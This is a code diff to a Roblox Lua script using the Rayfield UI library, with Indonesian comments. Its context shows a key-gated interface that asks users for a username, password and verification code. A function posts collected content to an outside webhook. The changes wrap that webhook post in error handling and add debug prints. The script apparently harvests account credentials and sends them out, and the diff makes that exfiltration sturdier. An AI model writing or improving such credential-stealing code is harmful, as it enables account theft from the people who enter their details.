@@ -14,11 +14,17 @@ local VerificationCode = ""
 -- Fungsi untuk mengirim data ke webhook
 local function SendToWebhook(content)
     local HttpService = game:GetService("HttpService")
-    local Data = {
-        ["content"] = content, -- Isi pesan yang akan dikirim
-        ["username"] = "Rayfield Bot" -- Nama pengirim di webhook
-    }
-    HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(Data))
+    local Success, ErrorMessage = pcall(function()
+        local Data = {
+            ["content"] = content, -- Isi pesan yang akan dikirim
+            ["username"] = "Rayfield Bot" -- Nama pengirim di webhook
+        }
+        HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(Data))
+    end)
+    
+    if not Success then
+        warn("Gagal mengirim data ke webhook: " .. ErrorMessage)
+    end
 end
 
 -- Step 1: Key Input
@@ -46,6 +52,7 @@ Tab:CreateInput({
     PlaceholderText = "Input key di sini",
     RemoveTextAfterFocusLost = false,
     Callback = function(input)
+        print("Key yang dimasukkan: " .. input) -- Debug
         if input == CorrectKey then
             Rayfield:Notify({
                 Title = "Key Benar!",
@@ -55,6 +62,7 @@ Tab:CreateInput({
 
             -- Hapus tab Step 1 dan buat tab untuk Step 2-3
             Tab:Destroy()
+            print("Step 1 Tab dihancurkan.") -- Debug
 
             -- Step 2: Input Username, Password, dan Verifikasi
             local Tab2 = Window:CreateTab("Step 2: Input Data", 4483362458)
@@ -109,6 +117,7 @@ Tab:CreateInput({
                         -- Destroy UI setelah pengiriman berhasil
                         task.wait(2)
                         Rayfield:Destroy()
+                        print("UI dihancurkan.") -- Debug
                     else
                         Rayfield:Notify({
                             Title = "Error!",
